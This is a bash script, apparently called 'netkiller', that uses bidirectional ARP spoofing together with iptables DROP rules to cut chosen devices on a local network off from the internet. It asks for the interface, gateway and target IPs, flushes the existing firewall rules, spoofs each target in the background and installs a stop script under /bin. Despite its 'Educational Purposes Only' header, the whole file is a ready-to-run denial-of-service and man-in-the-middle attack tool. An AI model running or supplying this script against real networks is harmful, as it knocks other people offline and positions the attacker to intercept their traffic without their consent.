#!/bin/bash

# ARP Spoofing Internet Blocker (Educational Purposes Only)
# Requires: arpspoof, iptables, and root privileges

# Detect Interface
WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
echo "Enter Wireless Interface: Enter by default"
read -p "> $WLAN " WLN
INTERFACE="${WLN:-$WLAN}"

# Detect Gateway IP
GW=$(ip route show dev "$INTERFACE" | awk '/default/ {print $3}')
echo "Enter Router Gateway IP: Enter by default"
read -p "> $GW" INET
GATEWAY="${INET:-$GW}"

# Detect Subnet
MASK=$(ip addr show "$INTERFACE" | grep 'inet ' | awk '{print $2}')
echo "Enter multiple target: e.g 192.168.1.110 192.168.1.111"
read -p "> " IPS
TARGET_IPS="${IPS:-$MASK}"

# Detect Device IP
echo "Enter Device IP: Enter by default"
IP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1)
read -p "> $IP" DEVIP
MYIP="${DEVIP:-$IP}"

echo ""
# Prompt configuration
echo "Your Arpspoof Configurations..."
echo ""
echo "INTERFACE: | $INTERFACE"
echo "GATEWAY:   | $GATEWAY"
echo "MYIP:      | $MYIP"
echo "TARGETS:   | $TARGET_IPS"

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush Iptables existing rules
iptables -F
iptables -X
iptables -t nat -F
iptables -F FORWARD

# Remove Iptables rules
cat > /bin/netkiller-stop << EOF
#!/bin/sh

iptables -F
iptables -X
iptables -t nat -F
iptables -F FORWARD
pkill arpspoof
echo "Restoring the Connections..."
EOF
chmod 755 /bin/netkiller-stop

for TARGET in $TARGET_IPS; do
    (
       # Block all trafficexcept the device ip and gateway (bidirectional)
        iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
        iptables -I FORWARD ! -s "$GATEWAY" -d "$MYIP" -j DROP

      # Bidirectional Arp Spoofing
        arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
        arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
    ) &
done

echo "Attacks is running in the background...!!!"
echo "To stop, Run: netkiller-stop"
